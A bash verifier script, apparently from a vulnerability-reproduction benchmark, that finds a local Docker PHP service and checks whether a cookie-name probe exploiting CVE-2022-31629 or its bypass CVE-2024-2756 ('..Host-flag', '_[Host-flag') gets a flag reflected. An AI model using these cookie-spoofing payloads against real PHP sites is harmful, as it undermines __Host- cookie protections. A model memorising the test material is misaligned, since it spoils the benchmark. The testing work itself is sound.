#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0 = RUN_FLAG_REF appears in reflected __Host-flag JSON slot
# 10 = blocked / not observed; 20 = env; 30 = usage
#
# seed:     Cookie: ..Host-flag=<RUN_FLAG>     (CVE-2022-31629)
# residual: Cookie: _[Host-flag=<RUN_FLAG>     (CVE-2024-2756; inline, never seed fallback)
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# Probe cookie VALUE is the current RUN_FLAG (wrong/stale overrides must not self-match
# RUN_FLAG_REF). Do not reuse a start-planted PCB_FLAG.
export PCB_FLAG="$RUN_FLAG"

SVC="$VERSION"
PORT=""
for _ in $(seq 1 30); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
    port "$SVC" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -z "$PORT" ]]; then
    CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
      ps -q "$SVC" 2>/dev/null | head -1)"
    if [[ -n "$CID" ]]; then
      PORT="$(docker port "$CID" 80 2>/dev/null | head -1 | sed 's/.*://' | tr -d '[:space:]')"
    fi
  fi
  if [[ -n "$PORT" ]]; then
    body="$(curl -sS --max-time 5 "http://127.0.0.1:${PORT}/" || true)"
    if printf '%s' "$body" | grep -q '__Host-flag'; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
if [[ -z "$PORT" ]]; then
  echo "verify: no mapped port for $SVC:80" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'cookie_name': s.strip() or '..Host-flag'}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
else
  # CVE-2024-2756: unmatched '[' second-round maps '[' → '_'.
  # Public residual cookie name (GHSA `_[Host-x`): `_[Host-flag`
  # Inline literal only. Never original_poc, never heldout, never seed fallback.
  printf '%s' '{"probe_id":"residual-unclosed-bracket","cookie_name":"_[Host-flag"}' > "$WORK_DIR/cand.json"
fi

OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
JUDGE="${RUN_FLAG_REF:-$RUN_FLAG}"
if grep -q "$JUDGE" <<<"$BODY"; then exit 0; else exit 10; fi
